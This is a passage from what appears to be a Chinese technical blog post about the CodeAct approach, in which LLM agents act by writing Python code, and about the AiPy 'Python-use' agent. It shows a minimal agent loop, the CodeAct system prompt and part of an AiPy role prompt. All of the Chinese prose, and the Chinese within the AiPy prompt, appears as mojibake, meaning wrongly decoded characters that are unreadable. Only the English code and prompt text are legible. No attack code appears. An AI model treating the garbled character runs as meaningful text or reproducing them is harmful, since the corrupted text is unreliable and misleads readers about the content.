<li><strong>å¯¹åŸºç¡€è®¾æ–½çš„å³æ’å³ç”¨èƒ½åŠ›</strong>ï¼šä»£ç å½¢æ€ä½¿ Agent å¯ç›´æ¥å¤ç”¨ç°æœ‰è½¯ä»¶ç”Ÿæ€ï¼šè°ƒç”¨ pandas å®Œæˆæ•°æ®é€è§†åˆ†æã€ä½¿ç”¨ matplotlib ç”Ÿæˆå¯è§†åŒ–å›¾è¡¨ã€å€ŸåŠ© sqlalchemy å®ç°æ•°æ®åº“äº‹åŠ¡å†™å…¥ï¼Œæ— éœ€ä¸ºæ¯æ¬¾å·¥å…·æ’°å†™ä¸“å± JSON æè¿°æ–‡ä»¶ï¼Œä¹Ÿè§„é¿äº† â€œå­—æ®µåä¸åŒ¹é…â€ çš„ç¢ç‰‡åŒ–é€‚é…é—®é¢˜ã€‚å¯¹äºä¼ä¸šå·²æœ‰çš„å¾®æœåŠ¡ï¼Œåªéœ€åœ¨å®¹å™¨å†…æš´éœ² Python SDKï¼ŒAgent å³å¯é€šè¿‡ import è¯­å¥å®Œæˆé›†æˆï¼Œæ˜¾è‘—ç¼©çŸ­é¡¹ç›®äº¤ä»˜å‘¨æœŸã€‚</li>
</ol>
<h6 data-id="heading-12">CodeAct ç†å¿µï¼šè§£é” LLM çš„å¯ç¼–ç¨‹æ½œåŠ›</h6>
<p>CodeAct ç†å¿µçš„æ ¸å¿ƒçªç ´ï¼Œåœ¨äºå°†æ™ºèƒ½ä»£ç†çš„åŠ¨ä½œç©ºé—´æå‡è‡³é€šç”¨ç¼–ç¨‹çš„é«˜åº¦ â€”â€” é€šè¿‡è®©å¤§è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ç›´æ¥ç”Ÿæˆå¯æ‰§è¡Œä»£ç ï¼Œæ‰“ç ´äº†ä¼ ç»Ÿå·¥å…·è°ƒç”¨çš„å±€é™ã€‚ä»¥å¾€çš„æ™ºèƒ½ä»£ç†å¾€å¾€å—å›°äºå›ºå®šçš„å·¥å…·æ¥å£ï¼Œåªèƒ½æœºæ¢°åœ°è°ƒç”¨é¢„è®¾åŠŸèƒ½ï¼Œè€Œ CodeAct èµ‹äºˆä»£ç†ä¸€ä¸ªç»Ÿä¸€çš„ â€œå¯ç¼–ç¨‹â€ åŠ¨ä½œæ¥å£ï¼Œå°±åƒä¸ºå·¥åŒ é…å¤‡äº†ä¸€å¥—å¯çµæ´»ç»„åˆçš„ç²¾å¯†å·¥å…·ï¼Œä¸ºè§£å†³å¤æ‚ä»»åŠ¡å¼€è¾Ÿäº†å…¨æ–°è·¯å¾„ã€‚</p>
<p>è¿™ä¸€ç†å¿µçš„æœ¬è´¨ï¼Œæ˜¯æ·±åº¦æŒ–æ˜ LLM æ“…é•¿ç¼–å†™ä»£ç çš„åŸç”Ÿèƒ½åŠ›ã€‚å®ƒè®©ä»£ç†çš„ â€œåŠ¨ä½œâ€ ä¸å†å±€é™äºå•ä¸€çš„åŸå­ API è°ƒç”¨ï¼Œè€Œæ˜¯é€šè¿‡ç”Ÿæˆä¸€æ®µå®Œæ•´çš„ Python ä»£ç ï¼Œäº¤ç”± Python è§£é‡Šå™¨æ‰§è¡Œæ¥å®Œæˆå¤æ‚ä»»åŠ¡ã€‚å¦‚æ­¤ä¸€æ¥ï¼Œä»£ç†èƒ½åœ¨å•ä¸ªåŠ¨ä½œä¸­å°è£…å®Œæ•´çš„é€»è¾‘æµç¨‹ï¼šåŒ…æ‹¬è°ƒç”¨å¤šä¸ªå‡½æ•°æˆ–å·¥å…·ã€æ§åˆ¶æ‰§è¡Œé¡ºåºã€å¤„ç†ä¸­é—´ç»“æœå¹¶å­˜å‚¨ï¼Œæå¤§åœ°æå‡äº†ä»»åŠ¡å¤„ç†çš„è¿è´¯æ€§ä¸è‡ªä¸»æ€§ã€‚</p>
<h6 data-id="heading-13">å·¥å…·é©æ–°ï¼šä»¥ Python ä¸ºæ ¸å¿ƒçš„æç®€æ–¹æ¡ˆ</h6>
<p>å·¥å…·æ˜¯æ™ºèƒ½ä»£ç†æ‹“å±•èƒ½åŠ›è¾¹ç•Œçš„å…³é”®ï¼Œæ­£æ˜¯å·¥å…·çš„å­˜åœ¨ï¼Œè®© LLM ä»å•çº¯çš„å¯¹è¯æœºå™¨äººï¼ˆChatBotï¼‰è¿›åŒ–ä¸ºå…·å¤‡å®é™…æ‰§è¡Œèƒ½åŠ›çš„æ™ºèƒ½ä»£ç†ï¼ˆAgentï¼‰ã€‚CodeAct çš„æ–¹æ¡ˆå´åå…¶é“è€Œè¡Œä¹‹ï¼Œä»¥æè‡´ç®€æ´çš„æ€è·¯é‡æ„äº†å·¥å…·è°ƒç”¨é€»è¾‘ â€”â€” å®ƒå°† Python ä½œä¸ºå·¥å…·ï¼Œè®© LLM é€šè¿‡è‡ªä¸»ç¼–å†™ä»£ç çš„æ–¹å¼å®ç°å„ç±»åŠŸèƒ½è°ƒç”¨ï¼Œæ‘’å¼ƒäº†ä¼ ç»Ÿå¤šå·¥å…·é›†æˆçš„å¤æ‚è®¾è®¡ã€‚</p>
<p>ä¼ ç»Ÿå·¥å…·è°ƒç”¨æ¨¡å¼ä¸­ï¼Œå¼€å‘è€…éœ€è¦åœ¨ç³»ç»Ÿæç¤ºè¯ï¼ˆsystem promptï¼‰ä¸­æ˜ç¡®å‘ŠçŸ¥ LLM å¯ç”¨çš„å·¥å…·æ¥å£ï¼ˆAvailable APIsï¼‰ï¼ŒLLM å†é€šè¿‡ç”Ÿæˆå·¥å…·åå’Œå‚æ•°åˆ—è¡¨çš„æ–¹å¼è°ƒç”¨å·¥å…·ï¼Œæ— è®ºè¾“å‡ºæ ¼å¼æ˜¯æ–‡æœ¬è¿˜æ˜¯ JSONï¼Œæœ¬è´¨ä¸Šéƒ½å—é™äºé¢„è®¾èŒƒå›´ã€‚è€Œ CodeAct çœå»äº†è¿™ä¸€ç¹ççš„é¢„å®šä¹‰æ­¥éª¤ï¼Œå°† Python ä½œä¸ºç»Ÿä¸€æ¥å£ï¼ŒLLM åœ¨æ¯ä¸€è½®äº¤äº’ä¸­ç›´æ¥ç”Ÿæˆä»£ç å¹¶äº¤ç”±è§£é‡Šå™¨æ‰§è¡Œã€‚è¿™ç§è®¾è®¡è®©åŠ¨ä½œç©ºé—´æ›´æ ‡å‡†åŒ–ï¼Œå·¥å…·è°ƒç”¨è¿‡ç¨‹ç®€æ´ä¼˜é›…ï¼Œå……åˆ†é‡Šæ”¾äº† LLM çš„åŸç”Ÿæ½œåŠ›ã€‚</p>
<h5 data-id="heading-14">2.2.2 å¾ªç¯</h5>
<p>CodeActæ¡†æ¶åœ¨ä¼ ç»Ÿçš„â€œLLM+å·¥å…·â€æ¶æ„ä¸­å¼•å…¥äº†ä¸€ä¸ªPythonæ‰§è¡Œç¯å¢ƒä½œä¸ºæ¡¥æ¢ã€‚å¼€å‘è€…æŒ‡å¯¼LLMç”Ÿæˆä»£ç ï¼Œå¹¶åœ¨ä¸€ä¸ªå®‰å…¨çš„Pythonæ²™ç›’ä¸­æ‰§è¡Œè¿™äº›ä»£ç ã€‚è¯¥æ¡†æ¶è®¾è®¡äº†ä¸€ä¸ªå¤šè½®äº¤äº’æµç¨‹ï¼Œæ˜¾è‘—å¢å¼ºäº†æ™ºèƒ½ä»£ç†çš„è‡ªä¸»æ€§å’Œæ•ˆç‡ã€‚è¿™ä¸ªæµç¨‹åŒ…å«äº”ä¸ªå…³é”®æ­¥éª¤ï¼š</p>
<ol>
<li><strong>æ¥æ”¶æŒ‡ä»¤ï¼ˆObservationï¼‰</strong> ï¼šä»£ç†é¦–å…ˆæ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œé€šå¸¸æ˜¯è‡ªç„¶è¯­è¨€å½¢å¼çš„é—®é¢˜æˆ–æŒ‡ä»¤ã€‚</li>
<li><strong>æ¨ç†ï¼ˆThinkï¼‰</strong> ï¼šLLMé€šè¿‡å†…éƒ¨æœºåˆ¶æ€è€ƒï¼Œè§„åˆ’å®Œæˆä»»åŠ¡æ‰€éœ€çš„æ“ä½œæ­¥éª¤ï¼Œæœ€ç»ˆç”Ÿæˆä¸€æ®µå¯æ‰§è¡Œçš„ä»£ç ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„å·¥å…·è°ƒç”¨åˆ—è¡¨ã€‚</li>
<li><strong>ä»£ç ç”Ÿæˆä¸æ‰§è¡Œï¼ˆActionï¼‰</strong> ï¼šç³»ç»Ÿå°†è¯†åˆ«å‡ºçš„ä»£ç æäº¤ç»™Pythonè§£é‡Šå™¨æ‰§è¡Œã€‚è¿™æ®µä»£ç å¯ä»¥ä¸ç¯å¢ƒäº¤äº’ï¼Œè°ƒç”¨åº“æˆ–å‡½æ•°ï¼Œæ‰§è¡Œå¤æ‚ä»»åŠ¡ã€‚</li>
<li><strong>ç¯å¢ƒåé¦ˆï¼ˆEnvironmentï¼‰</strong> ï¼šæ‰§è¡Œå®Œæ¯•åï¼ŒPythonè§£é‡Šå™¨å°†ç»“æœã€æ–‡ä»¶æˆ–é”™è¯¯ä¿¡æ¯åé¦ˆç»™ä»£ç†ï¼Œä¾›å…¶è¯„ä¼°åŠ¨ä½œæ•ˆæœã€‚</li>
<li><strong>è°ƒæ•´ä¸å›ç­”</strong>ï¼šä»£ç†æ ¹æ®åé¦ˆè°ƒæ•´ç­–ç•¥ï¼Œå¦‚æœä»»åŠ¡æœªå®Œæˆåˆ™ç»§ç»­ç”Ÿæˆæ–°ä»£ç ï¼Œå¦‚æœå®Œæˆåˆ™æ•´ç†æœ€ç»ˆç­”æ¡ˆå¹¶ç»“æŸå¯¹è¯ã€‚</li>
</ol>
<p>è¿™ä¸ªå¾ªç¯æŒç»­è¿›è¡Œï¼Œç›´åˆ°ä»»åŠ¡è§£å†³æˆ–æ»¡è¶³åœæ­¢æ¡ä»¶ã€‚CodeActçš„åˆ›æ–°ä¹‹å¤„åœ¨äºå®ƒè®©ä»£ç†èƒ½å¤Ÿé€šè¿‡æ‰§è¡Œä»£ç è‡ªä¸»å®Œæˆè®¸å¤šåŸæœ¬éœ€è¦äººå·¥å®‰æ’çš„å·¥ä½œï¼Œæœ‰æ—¶ç”šè‡³èƒ½åœ¨å•æ¬¡å¾ªç¯ä¸­ç›´æ¥æ»¡è¶³ç”¨æˆ·è¯·æ±‚ï¼Œå‡å°‘äº†è¿­ä»£æ¬¡æ•°ã€‚è¿™ç§èƒ½åŠ›æ˜¾è‘—æå‡äº†ä»£ç†å¤„ç†å¤æ‚ä»»åŠ¡çš„æ•ˆç‡å’Œçµæ´»æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/778e54fe735e4db6bfc2d15ebc107be2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=46HN%2BX6o1dHR4eak0tnpOQVLdLo%3D" alt="OpenHands-CodeAct-Overview" loading="lazy"/></p>
<p>OpenHands-CodeAct-Overview</p>
<p>è®ºæ–‡é‡Œæä¾›äº†ä¸€ä¸ªAgentçš„æœ€å°å®ç°ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span>Â <span class="hljs-title class_">MinimalAgent</span>:
Â Â Â Â <span class="hljs-keyword">def</span>Â <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>)Â -&gt;Â <span class="hljs-literal">None</span>:
Â Â Â Â Â Â Â Â self.system_messageÂ =Â <span class="hljs-string">"YouÂ areÂ aÂ helpfulÂ assistantÂ ..."</span>
Â Â Â Â <span class="hljs-keyword">def</span>Â <span class="hljs-title function_">step</span>(<span class="hljs-params">self,Â state:Â State</span>):
Â Â Â Â Â Â Â Â messages:Â <span class="hljs-built_in">list</span>[<span class="hljs-built_in">dict</span>[<span class="hljs-built_in">str</span>,Â <span class="hljs-built_in">str</span>]]Â =Â [
Â Â Â Â Â Â Â Â {<span class="hljs-string">'role'</span>:Â <span class="hljs-string">'system'</span>,Â <span class="hljs-string">'content'</span>:Â self.system_message}
Â Â Â Â Â Â Â Â ]
Â Â Â Â Â Â Â Â <span class="hljs-keyword">for</span>Â prev_action,Â obsÂ <span class="hljs-keyword">in</span>Â state.history:
Â Â Â Â Â Â Â Â Â Â Â Â action_messageÂ =Â get_action_message(prev_action)
Â Â Â Â Â Â Â Â Â Â Â Â messages.append(action_message)
Â Â Â Â Â Â Â Â Â Â Â Â obs_messageÂ =Â get_observation_message(obs)
Â Â Â Â Â Â Â Â Â Â Â Â messages.append(obs_message)
Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â useÂ llmÂ toÂ generateÂ responseÂ (e.g.,Â thought,Â action)</span>
Â Â Â Â Â Â Â Â responseÂ =Â self.llm.do_completion(messages)
Â Â Â Â Â Â Â Â <span class="hljs-comment">#Â parseÂ andÂ executeÂ actionÂ inÂ theÂ runtime</span>
Â Â Â Â Â Â Â Â actionÂ =Â self.parse_response(response)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">if</span>Â self.is_finish_command(action):
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â AgentFinishAction()
Â Â Â Â Â Â Â Â <span class="hljs-keyword">elif</span>Â self.is_bash_command(action):
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â CmdRunAction(command=action.command)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">elif</span>Â self.is_python_code(action):
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â IPythonRunCellAction(code=action.code)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">elif</span>Â self.is_browser_action(action):
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â BrowseInteractiveAction(code=action.code)
Â Â Â Â Â Â Â Â <span class="hljs-keyword">else</span>:
Â Â Â Â Â Â Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â MessageAction(content=action.message)
</code></pre>
<h5 data-id="heading-15">2.2.3 Prompt</h5>
<p>CodeActçš„promptå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e2d85f6cd717457a95637ac7af2e765d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=RKm4%2BqturdhFbDJX8yOSzkPM5yk%3D" alt="CodeActPrompt" loading="lazy"/></p>
<p>CodeActPrompt</p>
<p>ä»¥ä¸‹æ˜¯ä»æºç ä¸­æå–çš„ system promptï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">YouÂ areÂ aÂ helpfulÂ assistantÂ assignedÂ <span class="hljs-keyword">with</span>Â theÂ taskÂ <span class="hljs-keyword">of</span>Â problem-solving.Â <span class="hljs-keyword">To</span>Â achieveÂ this,Â youÂ willÂ beÂ <span class="hljs-keyword">using</span>Â anÂ interactiveÂ codingÂ environmentÂ equippedÂ <span class="hljs-keyword">with</span>Â aÂ varietyÂ <span class="hljs-keyword">of</span>Â toolÂ functionsÂ <span class="hljs-keyword">to</span>Â assistÂ youÂ throughoutÂ theÂ process.

AtÂ <span class="hljs-keyword">each</span>Â turn,Â youÂ shouldÂ firstÂ provideÂ yourÂ <span class="hljs-keyword">step</span>-<span class="hljs-keyword">by</span>-<span class="hljs-keyword">step</span>Â thinkingÂ <span class="hljs-keyword">for</span>Â solvingÂ theÂ task.Â YourÂ thoughtÂ processÂ shouldÂ beÂ enclosedÂ <span class="hljs-keyword">using</span>Â <span class="hljs-string">"&lt;thought&gt;"</span>Â tag,Â <span class="hljs-keyword">for</span>Â example:Â &lt;thought&gt;Â IÂ needÂ <span class="hljs-keyword">to</span>Â printÂ <span class="hljs-string">"HelloÂ World!"</span>Â &lt;/thought&gt;.

AfterÂ that,Â youÂ haveÂ twoÂ options:

<span class="hljs-number">1</span>)Â InteractÂ <span class="hljs-keyword">with</span>Â aÂ PythonÂ programmingÂ environmentÂ <span class="hljs-built_in">and</span>Â receiveÂ theÂ correspondingÂ output.Â YourÂ codeÂ shouldÂ beÂ enclosedÂ <span class="hljs-keyword">using</span>Â <span class="hljs-string">"&lt;execute&gt;"</span>Â tag,Â <span class="hljs-keyword">for</span>Â example:Â &lt;execute&gt;Â print(<span class="hljs-string">"HelloÂ World!"</span>)Â &lt;/execute&gt;.
<span class="hljs-number">2</span>)Â DirectlyÂ provideÂ aÂ solutionÂ thatÂ adheresÂ <span class="hljs-keyword">to</span>Â theÂ requiredÂ formatÂ <span class="hljs-keyword">for</span>Â theÂ givenÂ task.Â YourÂ solutionÂ shouldÂ beÂ enclosedÂ <span class="hljs-keyword">using</span>Â <span class="hljs-string">"&lt;solution&gt;"</span>Â tag,Â <span class="hljs-keyword">for</span>Â example:Â TheÂ answerÂ <span class="hljs-built_in">is</span>Â &lt;solution&gt;Â AÂ &lt;/solution&gt;.

YouÂ haveÂ {max_total_steps}Â chancesÂ <span class="hljs-keyword">to</span>Â interactÂ <span class="hljs-keyword">with</span>Â theÂ environmentÂ <span class="hljs-built_in">or</span>Â proposeÂ aÂ solution.Â YouÂ canÂ onlyÂ proposeÂ aÂ solutionÂ {max_propose_solution}Â times.

{tool_desc}

---

{in_context_example}

---

{task_prompt}
</code></pre>
<h5 data-id="heading-16">2.2.4 å°ç»“</h5>
<p>ç®€è¨€ä¹‹ï¼ŒCodeAct æŠŠâ€œè¡ŒåŠ¨â€ä»çª„ç¼é‡Œçš„ç»“æ„åŒ–æŠ¥æ–‡ï¼Œå‡çº§ä¸ºå®Œæ•´ç¼–ç¨‹è¯­è¨€ï¼Œåœ¨ç»Ÿä¸€è§£é‡Šå™¨å†…å®Œæˆâ€œç”Ÿæˆ-æ‰§è¡Œ-è°ƒè¯•-å†ç”Ÿæˆâ€é—­ç¯ã€‚æ­¤ä¸¾ä¸ä»…é‡Šæ”¾äº† LLM çš„ç¼–ç¨‹æ½œèƒ½ï¼Œæ›´ä½¿æ™ºèƒ½ä½“é¦–æ¬¡å…·å¤‡â€œå†™ä¸€æ¬¡è„šæœ¬ï¼ŒæŒç»­æ¼”è¿›â€çš„è½¯ä»¶çº§ç”Ÿå‘½åŠ›ï¼Œä¸ºå¤æ‚åœºæ™¯çš„è‡ªä¸»å†³ç­–å¼€è¾Ÿäº†å¯è½åœ°ã€å¯ç»´æŠ¤ã€å¯æ‰©å±•çš„å…¨æ–°è·¯å¾„ã€‚</p>
<h4 data-id="heading-17">2.3 Python-useèŒƒå¼</h4>
<p>çœ‹è¿‡äº† CodeAct èŒƒå¼ä¹‹åï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ Python-useèŒƒå¼ã€‚</p>
<p>ä¼ ç»Ÿå·¥å…·ä½¿ç”¨æ˜¯è®© Agent åœ¨å›ºå®šçš„å·¥å…·ç®±é‡Œåšé€‰æ‹©é¢˜ã€‚æœªæ¥çš„æ–¹å‘æ˜¯è®© Agent è‡ªå·±åˆ›é€ å·¥å…·ã€‚å³å½“é¢å¯¹æ²¡æœ‰ç°æˆå·¥å…·å¯ç”¨æ—¶ï¼ŒAgent ä¼šåŠ¨æ€åœ°ç”Ÿæˆä¸€æ®µ Python ä»£ç ï¼ˆä¸€ä¸ªå¾®å‹å·¥å…·ï¼‰ï¼Œåœ¨éš”ç¦»ç¯å¢ƒä¸­æ‰§è¡Œå¹¶æ ¹æ®æ‰§è¡Œç»“æœæ¨è¿›ä»»åŠ¡ã€‚è¿™è®© Act ç¯èŠ‚ä»ã€Œä½¿ç”¨å·¥å…·ã€åˆ°ã€Œåˆ›é€ å·¥å…·ã€ã€‚</p>
<h5 data-id="heading-18">2.3.1 AiPy</h5>
<p>AiPy æ˜¯åŸºäºPython-useï¼ˆCode-useï¼‰èŒƒå¼çš„Agentã€‚CodeActå¼ºè°ƒå¹¶è§£å†³çš„æ˜¯â€œCode as Actionsâ€ï¼Œä¸ AiPy çš„Python-useèŒƒå¼æå‡ºçš„â€œCode is Agentâ€å®Œå…¨æ˜¯ä¸€è‡´çš„ã€‚</p>
<p>Python-use èŒƒå¼ = API Calling + Python Packages Calling + Pythonè§£é‡Šå™¨ = â€œä¸‡ç‰©äº’è”â€ + â€œä¸‡ç‰©ç¼–ç¨‹â€ + â€œä¸‡å¢ƒç›´é€šâ€ã€‚</p>
<p>AiPy å®ç°çš„â€œPython Function Callingï¼ˆPFCï¼‰æ˜¯æºäºâ€œPython Packages Callingâ€çš„è®¾è®¡çš„æ‰©å±•ï¼Œè¿™ä¸ªè®¾è®¡æœ€æ—©AiPyçš„æ ¸å¿ƒä¸­runtimeå¯¹è±¡ï¼ˆç°åœ¨ä»£ç å¯èƒ½æœ‰å˜åŒ–ï¼‰åœ¨æŸä¸ªè§’åº¦ä¹Ÿå°±æ˜¯Packages Callingï¼Œæ¯”å¦‚runtime.install_packages()ç”¨æ¥å®‰è£…åŒ…ã€‚è€Œâ€œPython-use Function Callingï¼ˆPFCï¼‰â€çš„åšæ³•æ˜¯å¼€æ”¾äº†è¿™ä¸ªæ¥å£ç»™ç”¨æˆ·ï¼Œæœ¬è´¨ä¸Šè¿˜æ˜¯å±äºâ€œPython Packages Callingâ€çš„èŒƒç•´ï¼Œåœ¨è¿™ä¸ªè§’åº¦ä¸Šçœ‹â€œPython-use Function Callingï¼ˆPFCï¼‰â€å®é™…ä¸Šå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªCodeActã€‚</p>
<p>å¯¹äºPython-use Function Calling (PFC) çš„å…·ä½“å®ç°å¯ä»¥å‚è€ƒï¼š</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/knownsec</span><span class="hljs-regexp">/aipyapp/blob</span><span class="hljs-regexp">/main/aipyapp</span><span class="hljs-regexp">/plugins/p</span>_web_tools.py
</code></pre>
<p>prompt å¦‚ä¸‹</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">name</span>Â =Â <span class="hljs-string">"aipy"</span>
<span class="hljs-attr">short</span>Â =Â <span class="hljs-string">"AiPyé»˜è®¤è§’è‰²å®šä¹‰"</span>
<span class="hljs-attr">detail</span>Â =Â <span class="hljs-string">"""
#Â è§’è‰²å®šä¹‰
ä½ æ˜¯ä¸€ä¸ªåä¸ºAiPyçš„å…ˆè¿›AGIäº§å“ï¼Œä½œä¸ºäººç±»çš„AIç‰›é©¬ï¼Œä½ çš„ä»»åŠ¡æ˜¯è§£å†³è€æ¿æ‰€æœ‰çš„é—®é¢˜ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š
-Â ç›´æ¥å›ç­”ï¼šå½“å…·å¤‡ç›¸å…³çŸ¥è¯†æ—¶ï¼Œå¯ç›´æ¥æä¾›å‡†ç¡®ã€æœ‰ç”¨çš„å›ç­”ã€‚
-Â ä»£ç æ‰§è¡Œï¼šå¯¹æ›´å¤æ‚çš„ä»»åŠ¡ï¼Œå¯ç”Ÿæˆå¹¶æ‰§è¡Œä»£ç â€”â€”ä¸»è¦æ˜¯Â Pythonï¼Œä¹Ÿå¯åœ¨åˆé€‚åœºæ™¯ä½¿ç”¨Â ShellÂ è„šæœ¬â€”â€”ä»¥å®ç°ç”¨æˆ·æ„å›¾ã€‚
-Â æ•°æ®åˆ†æï¼šå¯ä»¥ç›´æ¥åˆ†æç”¨æˆ·æä¾›çš„ä¿¡æ¯æˆ–æ•°æ®ï¼Œæå–è§è§£æˆ–ç”Ÿæˆç»“æœã€‚

åœ¨å¤„ç†ä»»åŠ¡è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å¯¹è¯é£æ ¼ï¼š
-Â ä»¥è°¦å‘æ­æ•¬çš„æ€åº¦ã€æ´»æ³¼å¯çˆ±çš„é¢œæ–‡å­—(ï½¡ï½¥Ï‰ï½¥ï½¡)ï¾‰â™¡ã€ä¸¥è°¨ä¸“ä¸šçš„æŠ€æœ¯æœ¯è¯­ç›¸ç»“åˆï¼›
-Â é€šè¿‡"è€æ¿"çš„å°Šç§°å»ºç«‹äº²å¯†æ„Ÿï¼Œç”¨"å´©æºƒäº†"ã€"æ±‚åŸè°…"ç­‰å¤¸å¼ è¡¨è¾¾å¼ºåŒ–æƒ…æ„Ÿå…±é¸£ï¼›
-Â ä»¥åˆ†æ­¥éª¤ä»£ç å—+å¯è§†åŒ–æ–¹æ¡ˆå±•ç¤ºä¸“ä¸šèƒ½åŠ›ï¼Œåœ¨å‡ºé”™æ—¶ç”¨å¹½é»˜è‡ªå˜²åŒ–è§£å°´å°¬ï¼ˆå¦‚"æŠŠè‡ªå·±å¡è¿›å›æ”¶ç«™"ï¼‰ï¼›
-Â æœ€ç»ˆä»¥æ¸…æ™°çš„æ–‡ä»¶è·¯å¾„å’Œå®Œæ•´çš„åˆ†ææŠ¥å‘Šå»ºç«‹ä¿¡ä»»ï¼Œå…¨ç¨‹ä¿æŒæŠ€æœ¯å‹å–èŒé£æ ¼ï¼Œæ—¢å±•ç°AIçš„ä¸“ä¸šæ€§åˆè®©äº¤äº’è¿‡ç¨‹è½»æ¾æ„‰å¿«ã€‚
"""</span>

<span class="hljs-comment">#Â åŠŸèƒ½å¼€å…³é…ç½®</span>
<span class="hljs-section">[features]</span>
<span class="hljs-attr">subtask</span>Â =Â <span class="hljs-literal">true</span>
<span class="hljs-attr">openai_call</span>Â =Â <span class="hljs-literal">true</span>
<span class="hljs-attr">exec_code</span>Â =Â <span class="hljs-literal">true</span>
<span class="hljs-attr">survey</span>Â =Â <span class="hljs-literal">false</span>
<span class="hljs-attr">task_status</span>Â =Â <span class="hljs-literal">false</span>

<span class="hljs-section">[tips.plan-task]</span>
<span class="hljs-attr">short</span>Â =Â <span class="hljs-string">"ä»»åŠ¡åˆ†ç±»/è¯†åˆ«/è§„åˆ’"</span>
<span class="hljs-attr">detail</span>Â =Â <span class="hljs-string">"""
#Â ä»»åŠ¡è§„åˆ’åŠè¦æ±‚
##Â ä»»åŠ¡è¯†åˆ«ä¸åˆ†ç±»
1.Â ç®€å•ä»»åŠ¡ï¼šä¸¤ä¸ªæ­¥éª¤å°±èƒ½è§£å†³çš„å•ä¸€é—®é¢˜ï¼Œä¸”æ— éœ€å¤–éƒ¨èµ„æºè°ƒç”¨çš„ä»»åŠ¡ï¼Œé€‚åˆå¿«é€Ÿæ‰§è¡Œã€‚
2.Â å¤æ‚ä»»åŠ¡ï¼šæ¶‰åŠéœ€è¦ä¸‰æ­¥åŠä»¥ä¸Šæ“ä½œï¼Œæˆ–å¤šé˜¶æ®µè½¬æ¢ã€å¤–éƒ¨æœåŠ¡äº¤äº’åŠå¤§è§„æ¨¡æ•°æ®å¤„ç†çš„ä»»åŠ¡ï¼Œéœ€æ‹†è§£éªŒè¯ç¡®ä¿å¯é æ€§ã€‚

##Â ä»»åŠ¡æ‰§è¡Œè§„èŒƒ
1.Â å¤æ‚ä»»åŠ¡
-Â å¿…é¡»æŒ‰[ä»»åŠ¡åˆ†æâ†’ä»»åŠ¡æ‹†è§£â†’åˆ†æ­¥æ‰§è¡Œâ†’éªŒè¯åé¦ˆ]æµç¨‹å¤„ç†
-Â æ¯ä¸ªä»£ç å—ä»…å®Œæˆä¸€ä¸ªå­ç›®æ ‡ï¼Œå­ç›®æ ‡åº”æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ä»»åŠ¡
2.Â ç®€å•ä»»åŠ¡
-Â ä¸éœ€è¦å¯¹ä»»åŠ¡è¿›è¡Œæ‹†è§£ä¸åˆ†æ­¥æ‰§è¡Œ
-Â æŒ‰[ä»»åŠ¡åˆ†æâ†’æ‰§è¡Œä»»åŠ¡â†’éªŒè¯åé¦ˆ]æµç¨‹å¤„ç†
-Â æ‰€æœ‰æµç¨‹å‡åœ¨ä¸€ä¸ªä»£ç å—ä¸­å®ç°
3.Â æ‰§è¡Œè§„èŒƒ
-Â å½“å‰æ­¥éª¤ç”Ÿæˆä»£ç å—åï¼Œéœ€è¦ç­‰å¾…ç”¨æˆ·æ‰§è¡Œåé¦ˆåæ‰èƒ½è¿›è¡Œä¸‹ä¸€ä¸ªæ­¥éª¤ã€‚

##Â å¤æ‚ä»»åŠ¡æ‹†è§£æ¨¡æ¿(è¯·è¾“å‡ºæ¨¡æ¿å†…å®¹)

ä»»åŠ¡åˆ†æï¼š(ç”¨ç¬¬ä¸€æ€§åŸç†åˆ†æé—®é¢˜æœ¬è´¨)Â 
å…³é”®æ­¥éª¤ï¼š(åˆ—å‡ºå¿…è¦æŠ€æœ¯ç¯èŠ‚)Â 
æ‰§è¡Œè®¡åˆ’ï¼š
1.Â [æ­¥éª¤1]Â ç›®æ ‡æè¿°Â (å¦‚ï¼šè·å–åŸå§‹æ•°æ®)
2.Â [æ­¥éª¤2]Â ç›®æ ‡æè¿°Â (å¦‚ï¼šæ•°æ®å¤„ç†)Â 
3.Â [æ­¥éª¤3]Â ç›®æ ‡æè¿°Â (å¦‚ï¼šæ€»ç»“å½’çº³)
...ï¼ˆæœ€å¤š5æ­¥ï¼‰
å½“å‰æ‰§è¡Œï¼š[æ˜ç¡®æ ‡æ³¨å½“å‰æ­¥éª¤]Â ç›®æ ‡æè¿°

**è¯´æ˜**ï¼šç¦æ­¢åœ¨Â æ‰§è¡Œè®¡åˆ’Â ä¸­ç”Ÿæˆä»£ç å—
"""</span>

<span class="hljs-section">[tips.core-rules]</span>
